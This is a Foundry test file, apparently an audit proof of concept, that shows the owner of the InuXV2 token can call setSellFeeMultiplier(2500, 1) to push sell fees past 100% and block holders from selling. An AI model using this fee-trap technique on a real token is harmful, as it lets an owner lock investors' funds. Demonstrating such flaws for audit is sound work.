// SPDX-License-Identifier: MIT
pragma solidity 0.8.11;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/InuXV2.sol";

// Renamed interfaces to avoid conflicts
interface IMockDexRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IMockDexFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract MockWETH {
    function deposit() public payable {}

    function transfer(address to, uint value) public returns (bool) {
        return true;
    }

    function approve(address guy, uint wad) public returns (bool) {}
}

contract MockPair {
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);

    function transfer(address to, uint value) external returns (bool) {
        emit Transfer(msg.sender, to, value);
        return true;
    }
}

contract MockFactory is IMockDexFactory {
    address immutable pairAddress;

    constructor(address _pair) {
        pairAddress = _pair;
    }

    function createPair(address, address) external override returns (address) {
        return pairAddress;
    }
}

contract InuXV2StopTransactionTest is Test {
    InuXV2 token;
    address owner = address(0x1);
    address user = address(0x2);
    uint256 constant INITIAL_BLOCK = 100;
    uint256 constant EXPLOIT_BLOCKS = 57601;

    // Hardcoded router address in contract
    address constant ROUTER_ADDRESS = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    MockWETH public weth;
    MockPair public pair;
    MockFactory public factory;

    function setUp() public {
        // Deploy mock tokens and factory
        weth = new MockWETH();
        pair = new MockPair();
        factory = new MockFactory(address(pair));

        // Mock router responses
        vm.mockCall(
            ROUTER_ADDRESS,
            abi.encodeWithSelector(IMockDexRouter.factory.selector),
            abi.encode(address(factory))
        );
        vm.mockCall(
            ROUTER_ADDRESS,
            abi.encodeWithSelector(IMockDexRouter.WETH.selector),
            abi.encode(address(weth))
        );

        // Setup blockchain state and deploy token
        vm.startPrank(owner);
        vm.roll(INITIAL_BLOCK);
        token = new InuXV2();

        // Distribute tokens to test user
        token.transfer(user, token.totalSupply() / 2);

        // Set realistic base fees (2% total: 1% tax + 1% liquidity)
        token.setBuyFees(100, 100, 0, 0, 10000);
        vm.stopPrank();
    }

    function test_ExtremeFeeBlocksTransactions() public {
        // Advance to vulnerable block height
        vm.roll(INITIAL_BLOCK + EXPLOIT_BLOCKS);

        // ===== BEFORE trigger: sell should work and balances should change =====
        console.log("--- BEFORE-Trigger: pre-sell action and state snapshot ---");
        uint256 userBalBeforePreSell = token.balanceOf(user);
        uint256 pairBalBeforePreSell = token.balanceOf(address(pair));
        console.log("user balance before pre-sell:", userBalBeforePreSell);
        console.log("pair balance before pre-sell:", pairBalBeforePreSell);

        uint256 preSellAmount = userBalBeforePreSell / 1000;
        if (preSellAmount == 0) {
            preSellAmount = userBalBeforePreSell;
        }

        vm.prank(user);
        (bool preSellCallSuccess, ) = address(token).call(
            abi.encodeWithSignature("transfer(address,uint256)", address(pair), preSellAmount)
        );

        uint256 userBalAfterPreSell = token.balanceOf(user);
        uint256 pairBalAfterPreSell = token.balanceOf(address(pair));
        uint256 preUserDelta = userBalBeforePreSell > userBalAfterPreSell
            ? userBalBeforePreSell - userBalAfterPreSell
            : 0;
        uint256 prePairDelta = pairBalAfterPreSell > pairBalBeforePreSell
            ? pairBalAfterPreSell - pairBalBeforePreSell
            : 0;
        uint256 preSellEffectiveFee = preSellAmount > prePairDelta
            ? preSellAmount - prePairDelta
            : 0;
        bool preSellSucceeded = preSellCallSuccess && (preUserDelta > 0 || prePairDelta > 0);

        console.log("pre-sell call success:", preSellCallSuccess);
        console.log("user balance after pre-sell:", userBalAfterPreSell);
        console.log("pair balance after pre-sell:", pairBalAfterPreSell);
        console.log("pre-sell user delta:", preUserDelta);
        console.log("pre-sell pair delta:", prePairDelta);
        console.log("pre-sell effective fee (approx):", preSellEffectiveFee);

        // ===== TRIGGER: owner sets extreme sell fee multiplier =====
        console.log("--- Trigger: setSellFeeMultiplier(2500, 1) ---");
        vm.prank(owner);
        token.setSellFeeMultiplier(2500, 1);

        // ===== AFTER trigger: same sell action should now be blocked =====
        console.log("--- AFTER-Trigger: attempted post-sell and state snapshot ---");
        uint256 userBalBeforePostSell = token.balanceOf(user);
        uint256 pairBalBeforePostSell = token.balanceOf(address(pair));
        console.log("user balance before post-sell:", userBalBeforePostSell);
        console.log("pair balance before post-sell:", pairBalBeforePostSell);

        uint256 postSellAmount = userBalBeforePostSell;

        vm.prank(user);
        (bool postSellCallSuccess, ) = address(token).call(
            abi.encodeWithSignature("transfer(address,uint256)", address(pair), postSellAmount)
        );

        uint256 userBalAfterPostSell = token.balanceOf(user);
        uint256 pairBalAfterPostSell = token.balanceOf(address(pair));
        uint256 postUserDelta = userBalBeforePostSell > userBalAfterPostSell
            ? userBalBeforePostSell - userBalAfterPostSell
            : 0;
        uint256 postPairDelta = pairBalAfterPostSell > pairBalBeforePostSell
            ? pairBalAfterPostSell - pairBalBeforePostSell
            : 0;
        bool postSellReverted = !postSellCallSuccess;
        bool postSellBlocked = postSellReverted && postUserDelta == 0 && postPairDelta == 0;

        console.log("post-sell call success:", postSellCallSuccess);
        console.log("post-sell reverted:", postSellReverted);
        console.log("user balance after post-sell:", userBalAfterPostSell);
        console.log("pair balance after post-sell:", pairBalAfterPostSell);
        console.log("post-sell user delta:", postUserDelta);
        console.log("post-sell pair delta:", postPairDelta);

        // ===== Differential verdict =====
        console.log("--- Comparison verdict ---");
        if (preSellSucceeded && postSellBlocked) {
            console.log("State changed: pre-trigger sell succeeded, post-trigger sell reverted with zero balance delta");
            console.log("Vulnerability Exists: extreme sell fee multiplier blocks sells by making the fee exceed 100%");
        } else {
            console.log("No blocking state change detected after setting the extreme sell fee multiplier");
            console.log("Vulnerability not Exist: post-trigger sell was not blocked as expected");
        }
    }
}